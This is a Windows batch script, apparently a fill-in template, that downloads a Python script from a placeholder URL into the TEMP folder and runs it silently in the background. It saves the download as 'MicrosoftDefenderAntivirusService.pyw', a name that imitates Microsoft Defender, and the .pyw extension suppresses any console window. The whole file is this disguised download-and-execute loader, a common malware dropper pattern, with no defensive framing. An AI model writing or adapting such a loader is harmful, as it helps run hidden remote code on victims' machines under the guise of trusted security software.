@echo off
set "TEMP_FOLDER=%TEMP%"
set "SCRIPT_NAME=MicrosoftDefenderAntivirusService.pyw"
set "SCRIPT_URL=https://example.com/your_script.py" REM Replace with the actual URL of your Python script

set "PYTHON_SCRIPT_PATH=%TEMP_FOLDER%\%SCRIPT_NAME%"

rem Check if Python is installed
python --version >NUL 2>NUL
if %errorlevel% neq 0 (
    echo Python is not installed. Please install Python and try again.
    exit /b 1
) else (
    echo Python is installed.
)

rem Check if Necessary files exist in the temp folder
if not exist "%PYTHON_SCRIPT_PATH%" (
    echo Necessary files not found. Downloading...
    curl -o "%PYTHON_SCRIPT_PATH%" "%SCRIPT_URL%"
) else (
    echo Necessary files already exist.
)

rem Run the Python script
start /B python "%PYTHON_SCRIPT_PATH%"

rem Pause to keep the console window open (optional)
pause
